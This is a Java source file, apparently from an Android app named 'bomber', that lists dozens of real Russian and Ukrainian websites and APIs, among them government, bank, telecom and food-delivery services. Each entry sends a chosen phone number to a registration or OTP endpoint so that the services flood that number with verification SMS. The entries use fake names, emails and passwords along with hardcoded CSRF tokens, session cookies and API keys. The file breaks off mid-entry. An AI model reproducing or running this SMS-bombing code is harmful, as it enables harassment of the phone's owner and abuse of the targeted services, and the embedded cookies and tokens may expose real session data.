package com.dm.bomber.services;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.Headers;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class ServicesRepository implements Repository {

    public final static Service[] services = new Service[]{

            new JsonService("https://www.gosuslugi.ru/auth-provider/mobile/register", 7) {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("instanceId", "123");
                        json.put("firstName", getRussianName());
                        json.put("lastName", getRussianName());
                        json.put("contactType", "mobile");
                        json.put("contactValue", format(phone.getPhone(), "+7(***)*******"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://my.telegram.org/auth/send_password") {
                @Override
                public void buildParams(Phone phone) {
                    builder.addQueryParameter("phone", "+" + phone.toString());
                }
            },

            new ParamsService("https://findclone.ru/register") {
                @Override
                public void buildParams(Phone phone) {
                    builder.addQueryParameter("phone", phone.toString());
                }
            },

            new FormService("https://shop.vodovoz-spb.ru/bitrix/tools/ajax_sms.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("phone", format(phone.getPhone(), "+7 (***) ***-**-**"));
                }
            },

            new ParamsService("https://vsem-edu-oblako.ru/singlemerchant/api/sendconfirmationcode", 7) {
                @Override
                public void buildParams(Phone phone) {
                    builder.addQueryParameter("lang", "ru");
                    builder.addQueryParameter("json", "true");
                    builder.addQueryParameter("merchant_keys", "b27447ba613046d3659f9730ccf15e3c");
                    builder.addQueryParameter("device_id", "f330883f-b829-41df-83f5-7e263b780e0e");
                    builder.addQueryParameter("device_platform", "desktop");
                    builder.addQueryParameter("phone", format(phone.getPhone(), "+7 (***) ***-**-**"));
                }
            },

            new JsonService("https://api.sunlight.net/v3/customers/authorization/") {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", phone.toString());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new Service(380) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("msisdn", phone.toString());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    client.newCall(new Request.Builder()
                            .url("https://mnp.lifecell.ua/mnp/get-token/")
                            .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                            .build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {

                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                            try {
                                JSONObject req = new JSONObject(Objects.requireNonNull(response.body()).string());

                                JSONObject json = new JSONObject();
                                json.put("contact", phone.toString());
                                json.put("otp_type", "standart");

                                client.newCall(new Request.Builder()
                                        .url("https://mnp.lifecell.ua/mnp/otp/send/")
                                        .header("authorization", "Token " + req.getString("token"))
                                        .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                                        .build()).enqueue(callback);

                            } catch (JSONException | NullPointerException e) {
                                callback.onError(call, e);
                            }
                        }
                    });
                }
            },

            new FormService("https://uss.rozetka.com.ua/session/auth/signup-phone", 380) {
                @Override
                public void buildBody(Phone phone) {
                    String name = getRussianName();

                    builder.add("title", name);
                    builder.add("first_name", name);
                    builder.add("last_name", getRussianName());
                    builder.add("password", getUserName() + "A123");
                    builder.add("email", getEmail());
                    builder.add("phone", phone.getPhone());
                    builder.add("request_token", "rB4eDGHMb00wHeQls7l4Ag==");

                    request.addHeader("Cookie", "ab-cart-se=new; xab_segment=123; slang=ru; uid=rB4eDGHMb00wHeQls7l4Ag==; visitor_city=1; _uss-csrf=zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5; ussat_exp=1640830991; ussat=8201437cececef15030d16966efa914d.ua-a559ca63edf16a11f148038356f6ac94.1640830991; ussrt=6527028eb43574da97a51f66ef50c5d0.ua-a559ca63edf16a11f148038356f6ac94.1643379791; ussapp=u3-u_ZIf2pBPN8Y6oGYIQZLBN4LUkQgplA_Dy2IX; uss_evoid_cascade=no");
                    request.addHeader("Csrf-Token", "zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5");
                }
            },

            new FormService("https://happywear.ru/index.php?route=module/registerformbox/ajaxCheckEmail", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("email", getEmail());
                    builder.add("telephone", format(phone.getPhone(), "7(***)***-**-**"));
                    builder.add("password", "qVVwa6QwcaCPP2s");
                    builder.add("confirm", "qVVwa6QwcaCPP2s");
                }
            },

            new ParamsService("https://www.sportmaster.ua/?module=users&action=SendSMSReg", 380) {
                @Override
                public void buildParams(Phone phone) {
                    builder.addQueryParameter("phone", phone.toString());
                }
            },

            new FormService("https://yaro.ua/assets/components/office/action.php", 380) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("action", "authcustom/formRegister");
                    builder.add("mobilephone", phone.toString());
                    builder.add("pageId", "116");
                    builder.add("csrf", "b1618ecce3d6e49833f9d9c8c93f9c53");
                }
            },

            new JsonService("https://api.01.hungrygator.ru/web/auth/webotp", 7) {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("userLogin", format(phone.getPhone(), "+7 (***) ***-**-**"));
                        json.put("fu", "bar");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://sushiicons.com.ua/kiev/index.php?route=common/cart/ajaxgetcoderegister", 380) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("firstname", getRussianName());
                    builder.add("phone", format(phone.getPhone(), "+380 (**) ***-**-**"));
                    builder.add("birthday", "2005-03-05");
                }
            },

            new JsonService("https://e-solution.pickpoint.ru/mobileapi/17100/sendsmscode") {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("PhoneNumber", phone.toString());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    request.addHeader("User-Agent", "Application name: pickpoint_android, Android version: 29, Device model: Mi 9T Pro (raphael), App version name: 3.9.0, App version code: 69, App flavor: , Build type: release");
                    request.addHeader("Connection", "Keep-Alive");
                    request.addHeader("Accept-Encoding", "gzip");

                    return json.toString();
                }
            },

            new JsonService("https://xn--80adjkr6adm9b.xn--p1ai/api/v5/user/start-authorization", 7) {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone.getPhone(), "+7 *** ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://c.ua/index.php?route=account/loginapples/sendSMS", 380) {
                @Override
                public void buildParams(Phone phone) {
                    builder.addQueryParameter("route", "account/loginapples/sendSMS");
                    builder.addQueryParameter("phone", "0" + phone);
                }
            },

            new FormService("https://almazholding.ru/local/user1/sendcode.php") {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("PHONE", phone.toString());
                    builder.add("ECAPTCHA", "undefined");
                }
            },

            new ParamsService("https://my.hmara.tv/api/sign", 380) {
                @Override
                public void buildParams(Phone phone) {
                    builder.addEncodedQueryParameter("contact", phone.toString());
                    builder.addEncodedQueryParameter("deviceId", "81826091-f299-4515-b70f-e82fd00fec9a");
                    builder.addEncodedQueryParameter("language", "ru");
                    builder.addEncodedQueryParameter("profileId", "1");
                    builder.addEncodedQueryParameter("deviceType", "2");
                    builder.addEncodedQueryParameter("ver", "2.2.9");

                    request.header("Cookie", "_ga=GA1.2.641734216.1650994527; _gid=GA1.2.109748838.1650994527; _gat_gtag_UA_131143143_1=1; _fbp=fb.1.1650994527815.1351289375; _hjFirstSeen=1; _hjSession_1352224=eyJpZCI6IjQ4ZWY4YmFhLTBmZDMtNGE1Yy05NGNiLWUzNzUzMjY5YWI5ZiIsImNyZWF0ZWQiOjE2NTA5OTQ1MjgzNTIsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=0; _hjSessionUser_1352224=eyJpZCI6ImQwMjA0NjA2LWNjYWUtNTBmNi1hMmNjLTU5YzdhMDQ5MTQwNyIsImNyZWF0ZWQiOjE2NTA5OTQ1Mjc4NzEsImV4aXN0aW5nIjp0cnVlfQ==; _gat=1");
                }
            },

            new JsonService("https://api-new.elementaree.ru/graphql") {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("operationName", "phoneVerification");
                        json.put("query", "mutation phoneVerification($phone: String!) {\n" +
                                "  phoneVerification(phone: $phone) {\n" +
                                "    success\n" +
                                "    interval\n" +
                                "    __typename\n" +
                                "  }\n" +
                                "}\n");

                        json.put("variables", new JSONObject()
                                .put("phone", phone.toString()));

                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://beerlogapizza.ru/ajax/global_ajax.php") {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("character", "number");
                    builder.add("phone", phone.getPhone());
                    builder.add("code", "");
                    builder.add("session_id", "e6ab56c6c97b3a47cdee0f60705a8561");
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://liski.skoro-pizza.ru/api/user/generate-password")
                            .header("x-thapl-apitoken", "b3cb999a-d3ad-11ec-84bd-d00d1849d38c")
                            .header("x-thapl-domain", "rossosh.skoro-pizza.ru")
                            .header("x-thapl-region-id", "5")
                            .post(RequestBody.create("------WebKitFormBoundaryMUU3NBWAJgnNsU1E\n" +
                                    "Content-Disposition: form-data; name=\"phone\"\n" +
                                    "\n" +
                                    format(phone.getPhone(), "+7 *** *** ** **") +
                                    "\n------WebKitFormBoundaryMUU3NBWAJgnNsU1E--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryMUU3NBWAJgnNsU1E")))
                            .build()).enqueue(callback);
                }
            },


            new FormService("https://be.budusushi.ua/login", 380) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("LoginForm[username]", "0" + phone);
                }
            },

            new FormService("https://zdesapteka.ru/bitrix/services/main/ajax.php?action=zs%3Amain.ajax.AuthActions.sendAuthCode", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("userPhone", format(phone.getPhone(), "+7 (***) ***-**-**"));
                    builder.add("SITE_ID", "s1");
                    builder.add("sessid", "fb5f8f6092762d032bfda6fd1f2947ad");
                }
            },

            new FormService("https://almazholding.ru/local/user1/sendcode.php") {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("PHONE", phone.toString());
                    builder.add("ECAPTCHA", "undefined");

                    request.header("Cookie", "_ym_d=1648577093; _ym_uid=1648577093945352536; PHPSESSID=l8uZ53Njk3Fnh6Sx5k6Fap6hW2CxC42l; ALTASIB_SITETYPE=original; BITRIX_SM_ALMAZ_GUEST_ID=5540491; BITRIX_SM_ALMAZ_LAST_ADV=5_Y; BITRIX_SM_ALMAZ_ALTASIB_LAST_IP=185.100.26.203; BITRIX_SM_ALMAZ_ALTASIB_GEOBASE=%7B%22ID%22%3A%222149%22%2C%22BLOCK_BEGIN%22%3A%223110344704%22%2C%22BLOCK_END%22%3A%223110345727%22%2C%22BLOCK_ADDR%22%3A%22185.100.24.0%20-%20185.100.27.255%22%2C%22COUNTRY_CODE%22%3A%22RU%22%2C%22CITY_ID%22%3A%222149%22%2C%22CITY_NAME%22%3A%22%D0%9C%D1%83%D1%80%D0%BE%D0%BC%22%2C%22REGION_NAME%22%3A%22%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%BC%D0%B8%D1%80%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C%22%2C%22COUNTY_NAME%22%3A%22%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3%22%2C%22BREADTH_CITY%22%3A%2255.574291%22%2C%22LONGITUDE_CITY%22%3A%2242.05151%22%7D; BITRIX_SM_ALMAZ_SALE_UID=101692370; BITRIX_SM_ALMAZ_ALTASIB_GEOBASE_COUNTRY=%7B%22country%22%3A%22RU%22%7D; BITRIX_SM_ALMAZ_refer=https%3A%2F%2Fwww.google.com%2F; BITRIX_SM_ALMAZ_CURRENT_CURRENCY=RUB; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A23%2C%22EXPIRE%22%3A1656449940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _gid=GA1.2.218161957.1656428115; _gat_gtag_UA_212738426_1=1; _ym_visorc=w; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _lhtm_u=62baf6a0c08c1de57308a35b; _lhtm_r=https%3A//www.google.com|60ec84b803dc9ecc5a9bc57a; lh_banner_closed=true; BITRIX_SM_ALMAZ_LAST_VISIT=28.06.2022%2017%3A55%3A42; _ga_EM9HX0LRBQ=GS1.1.1656428114.1.1.1656428143.0; BITRIX_SM_ALMAZ_window_width=983; _ga=GA1.2.274030319.1656428115; lh_widget_system_pages_counter=2");
                }
            },

            new JsonService("https://qlean.ru/widget-form/http/requestotp") {
                private static final String USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37";

                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("connection", 3);
                        json.put("csrfToken", "1a55c5d16d8059e75304cb02ddda566b7d2a96bd22cc92937ee5a894e6dfa734");
                        json.put("login", phone.toString());
                        json.put("send", 1);
                        json.put("userAgent", USER_AGENT);
                        json.put("userType", 1);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    request.header("User-Agent", USER_AGENT);

                    return json.toString();
                }
            },

            new ParamsService("https://stockmann.ru/ajax/", 7) {
                @Override
                public void buildParams(Phone phone) {
                    builder.addQueryParameter("controller", "user");
                    builder.addQueryParameter("action", "registerUser");
                    builder.addQueryParameter("surname", getRussianName());
                    builder.addQueryParameter("name", getRussianName());
                    builder.addQueryParameter("phone", format(phone.getPhone(), "+7 (***) *** - ** - **"));
                    builder.addQueryParameter("email", getEmail());
                    builder.addQueryParameter("password", "qwerty");
                    builder.addQueryParameter("password_confirm", "qwerty");
                }
            },

            new JsonService("https://adengi.ru/rest/v1/registration/code/send") {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("email", getEmail());
                        json.put("firstName", getRussianName());
                        json.put("lastName", getRussianName());
                        json.put("middleName", getRussianName());
                        json.put("phone", phone.toString());
                        json.put("via", "sms");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://sberuslugi.ru/api/v1/user/secret", 7) {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone.getPhone(), "+7 (***) ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("http://mrroll.ru/user/signin", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("_csrf", "5KvJ6CDYi4Laz2Q6CyFNkL_8Q7XCKIHwZ1GKFyOgvDG82braFuHZs567NFVDWC7Bibo53YoewMVQMsx0E-LteQ==");
                    builder.add("User[phone]", format(phone.getPhone(), "(***)***-**-**"));
                    builder.add("step", "send-sms");

                    request.header("X-CSRF-Token", "ILbsTHW-XK9IK-uHMiEupoGGozbm6QSvl06--OCEZsx4xJ9-Q4cOngxfu-h6WE33t8DZXq7fRZqgLfib0MY3hA==");
                    request.header("X-Requested-With", " XMLHttpRequest");
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://my.pochtabank.ru/dbo/registrationService/ib")
                            .post(RequestBody.create("", null))
                            .build()).enqueue(new Callback() {
                        @Override
                        public void onError(@NonNull Call call, @NonNull Exception e) {
                            callback.onError(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) {
                            JSONObject json = new JSONObject();

                            try {
                                json.put("confirmation", "send");
                                json.put("phone", format(phone.getPhone(), "+7 (***) ***-**-**"));
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                            StringBuilder cookie = new StringBuilder();

                            for (String entry : response.headers("Set-Cookie")) {
                                cookie.append(entry.split(";")[0]);
                                cookie.append("; ");
                            }

                            client.newCall(new Request.Builder()
                                    .url("https://my.pochtabank.ru/dbo/registrationService/ib/phoneNumber")
                                    .header("noti", "false")
                                    .header("Accept-Language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                                    .header("Cache-Control", "no-cache")
                                    .header("Connection", "keep-alive")
                                    .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
                                    .header("Accept-Encoding", "gzip, deflate, br")
                                    .header("pbib-save", "false")
                                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37")
                                    .header("Cookie", cookie.toString())
                                    .put(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                                    .build()).enqueue(callback);
                        }
                    });
                }
            },

            new FormService("https://api-user.privetmir.ru/api/v2/send-code", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("checkApproves", "Y");
                    builder.add("approve1", "on");
                    builder.add("approve2", "on");
                    builder.add("back_url", "");
                    builder.add("scope", "register-user reset-password");
                    builder.add("login", format(phone.getPhone(), "+7 (***) ***-**-**"));
                }
            },

            new JsonService("https://familyfriend.com/graphql") {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("operationName", "AuthEnterPhoneMutation");
                        json.put("query", "mutation AuthEnterPhoneMutation($input: RequestSignInCodeInput!) {\n" +
                                "  result: requestSignInCode(input: $input) {\n" +
                                "    ... on RequestSignInCodePayload {\n" +
                                "      codeLength\n" +
                                "      phone\n" +
                                "      __typename\n" +
                                "    }\n" +
                                "    ... on ErrorPayload {\n" +
                                "      message\n" +
                                "      __typename\n" +
                                "    }\n" +
                                "    __typename\n" +
                                "  }\n" +
                                "}\n");
                        json.put("variables", new JSONObject()
                                .put("input", new JSONObject()
                                        .put("phone", phone.toString())));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new Service() {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://tv.yota.ru/")
                            .get().build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {
                            callback.onFailure(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) {
                            JSONObject json = new JSONObject();

                            try {
                                json.put("msisdn", phone.toString());
                                json.put("password", "91234657");
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                            StringBuilder cookie = new StringBuilder();

                            for (String entry : response.headers("Set-Cookie")) {
                                cookie.append(entry.split(";")[0]);
                                cookie.append("; ");
                            }

                            try {
                                client.newCall(new Request.Builder()
                                        .url("https://bmp.tv.yota.ru/api/v10/auth/register/msisdn")
                                        .addHeader("Cookie", cookie.toString())
                                        .post(RequestBody.create(
                                                json.toString(), MediaType.parse("application/json")))
                                        .build()).enqueue(callback);
                            } catch (NullPointerException e) {
                                callback.onError(call, e);
                            }
                        }
                    });
                }
            },

            new JsonService("https://www.akbars.ru/api/PhoneConfirm/", 7) {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phoneNumber", phone);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://bandeatos.ru/?MODE=AJAX", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("sessid", "404d33f8bac1c1aa4305e6af3ebffa8b");
                    builder.add("FORM_ID", "bx_1789522556_form");
                    builder.add("PHONE_NUMBER", "+" + phone.toString());
                }
            },

            new FormService("https://passport.yandex.ru/registration-validations/phone-confirm-code-submit", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("csrf_token", "3a2c860df9d6b793a1062cb40bf6571642269832:1656577004061");
                    builder.add("track_id", "8871889a827b939106e809c0816c6dce7b");
                    builder.add("display_language", "ru");
                    builder.add("number", "+" + phone.toString());
                    builder.add("confirm_method", "by_sms");
                    builder.add("isCodeWithFormat", "true");

                    request.header("Cookie", "font_loaded=YSv1; is_gdpr=0; is_gdpr_b=COTFARC5cygC; gdpr=0; _ym_uid=1643893010141416800; _ym_d=1652798146; font_loaded=YSv1; yandexuid=7914983681643893008; yuidss=7914983681643893008; ymex=1655575105.oyu.4959164461652775453#1968158134.yrts.1652798134; amcuid=4406858161652983118; skid=1064401191653123531; uniqueuid=345303361654276841; yabs-frequency=/5/0000000000000000/mvQrk4DCvt4KHoFkZ9N-eSoLP1H78__Xm84D2_T454SW/; i=BoH9u854W7rcxdsH1l7gnXMrG/rNSF6osrsaJi7J+YSMW5LrOBGPVdsAnThO3Ap70wSZnZ0HftNPf9fGySNC71OzFPc=; _ym_isad=2; L=e1x6f2x7ZF1fcGx2ZFxqQHxfUgliBFF7CTVYJUQ6JC85HVsQfXhu.1656576669.15024.344649.4788377edf08f876583a87093cc95a2f; pf=eyJmbGFzaCI6e319; pf.sig=WEkihpon3qfXt708UtZSzfT2k62TloAdz1jg6_iLs5Q; yp=1686928109.p_sw.1655392109#1970408029.multib.1#1655720081.mcv.0#1655720081.mcl.aoz1dd#1655720081.szm.1_25%3A1536x864%3A1536x754; ys=; yandex_login=; ilahu=1656605475; mda2_beacon=1656576675309; _yasc=Dw1CMDhU6jQl4Yg0s1m8EdqT54dHp6tbTxEMI47UCqFefOD6HZNaWbHe+ASHaA==; _ym_visorc=b; lah=2:1719649004.15118.eqsQT97eD404jHo5.3zS2y6V9HL6Ei_2p02ujTncoDyp_NHLXddv0Hn_JKMZal9Am75T--od3FDE6kA5BLDDNuCUI9vqgMu2VdfXulkxCM549kUtPVHI2Q8wOCGGU9UKaRmrhQLQLHRKI9Tkm83Lgm5bOCa8XT2E.k7e5D0R8UPb4XarYr_fFWQ");
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://pizzaco.ru/api/user/generate-password")
                            .header("Cookie", "upkvartal-frontend=t466jslnqhsc8ffkaqlf65bnfg; _csrf-frontend=eca7110ac5f6820f172812ae76b93ea6f91976b5374d49b3e50823904e661505a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22MqdE5DQapqSuoKww3kzp22qKVRklmP2O%22%3B%7D; _ym_uid=1656577574308706185; _ym_d=1656577574; _ym_visorc=w; _ym_isad=2; advanced-api=cm1ium0dmmq1nbveiinjdiku16; api-key=4e661934-f84e-11ec-9a5c-d00d1849d38c; app-settings=%7B%22promo_text%22%3Anull%2C%22cart_suggest_header%22%3Anull%2C%22seo_info%22%3A%7B%22title%22%3A%22%D0%93%D0%BB%D0%B0%D0%B2%D0%BD%D0%B0%D1%8F%22%2C%22description%22%3Anull%7D%2C%22auth_by_call%22%3Afalse%2C%22voice_call_auth%22%3Afalse%2C%22has_promo_advice%22%3Afalse%2C%22ask_address_on_first_enter%22%3Atrue%2C%22ask_address_on_add_to_cart%22%3Atrue%2C%22min_order_value%22%3A600%2C%22order_disable_card_for_weight%22%3Afalse%2C%22app_store_id%22%3A%22app%22%2C%22order_cart_to_courier%22%3Atrue%2C%22order_auth%22%3Afalse%2C%22takeaway_enabled%22%3Atrue%2C%22not_heat%22%3Afalse%2C%22default_persons_count%22%3A%221%22%2C%22order_to_time%22%3Afalse%2C%22show_not_call%22%3Afalse%2C%22order_show_persons%22%3Atrue%2C%22disable_order%22%3Afalse%2C%22default_phone%22%3A%22%2B7(812)220-01-02%22%2C%22auth_enabled%22%3Atrue%2C%22catalog_currency_symbol%22%3A%22%D0%A0%22%2C%22app_menu%22%3A%5B%7B%22id%22%3A10%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A11%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata-mobil%22%7D%7D%5D%2C%22footer_menu%22%3A%5B%7B%22id%22%3A1%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A2%2C%22title%22%3A%22%D0%9A%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D1%8B%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22kontakty%22%7D%7D%2C%7B%22id%22%3A8%2C%22title%22%3A%22%D0%90%D0%BA%D1%86%D0%B8%D0%B8%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22akcii%22%7D%7D%2C%7B%22id%22%3A9%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata%22%7D%7D%5D%2C%22mobile_menu%22%3A%5B%7B%22id%22%3A5%2C%22title%22%3A%22%D0%9C%D0%B5%D0%BD%D1%8E%22%7D%2C%7B%22id%22%3A3%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A4%2C%22title%22%3A%22%D0%9A%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D1%8B%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22kontakty%22%7D%7D%2C%7B%22id%22%3A6%2C%22title%22%3A%22%D0%90%D0%BA%D1%86%D0%B8%D0%B8%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22akcii%22%7D%7D%2C%7B%22id%22%3A7%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata%22%7D%7D%5D%2C%22header_menu%22%3A%5B%5D%2C%22combine_promo_and_bonus%22%3Afalse%2C%22order_disable_cash%22%3Afalse%2C%22loyalty_program%22%3A%7B%22enabled%22%3Afalse%7D%2C%22whatsapp%22%3Anull%2C%22tg%22%3Anull%2C%22privacy_link%22%3Anull%2C%22promo_link%22%3A%22http%3A%2F%2Fabout.mnogolososya.ru%2Freceive_advertising%22%2C%22instagram%22%3Anull%2C%22vk%22%3Anull%2C%22facebook%22%3Anull%2C%22update_privacy%22%3Afalse%2C%22main_logo%22%3A%22https%3A%2F%2Fthapl-public.storage.yandexcloud.net%2F%2Fimg%2FSiteSetting%2F7eb85221f6c97c13f93532fffc1edc42_origin_.svg%22%2C%22additional_logo%22%3Anull%2C%22header_background%22%3A%22https%3A%2F%2Fstorage.yandexcloud.net%2Fthapl-public%2F%2Fimg%2FSiteSetting%2F74dff64b5b8cff080bc39a5678b2107d_origin.png%22%2C%22order_to_time_disable_holidays%22%3Atrue%2C%22order_to_time_min_gap_days%22%3A0%2C%22order_to_time_max_gap_days%22%3A2%2C%22start_up_promos%22%3A%5B%5D%2C%22check_region%22%3Afalse%7D")
                            .header("x-thapl-apitoken", "4e661934-f84e-11ec-9a5c-d00d1849d38c")
                            .post(RequestBody.create("------WebKitFormBoundaryMQ1naEW4T6mNqlQx\n" +
                                            "Content-Disposition: form-data; name=\"phone\"\n" +
                                            "\n" +
                                            format(phone.getPhone(), "+7 *** *** ** **\n") +
                                            "------WebKitFormBoundaryMQ1naEW4T6mNqlQx--",
                                    MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryMQ1naEW4T6mNqlQx")))
                            .build()).enqueue(callback);
                }
            },

            new FormService("https://my.sravni.ru/signin/code") {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("__RequestVerificationToken", "CfDJ8CweUVAmnVJNqszqP15xx-hitFFEfBAUJnGvIZBqF4kqdB5DijYyQ1u0JbRmCq1dmVlRFqphQ6HElnEEqCPG4scR5SV47pVWqKe2anjUFfDfInYU_PqxRR-YmP-jRR5i9RjiExsOMk6554nFT1bXJDw");
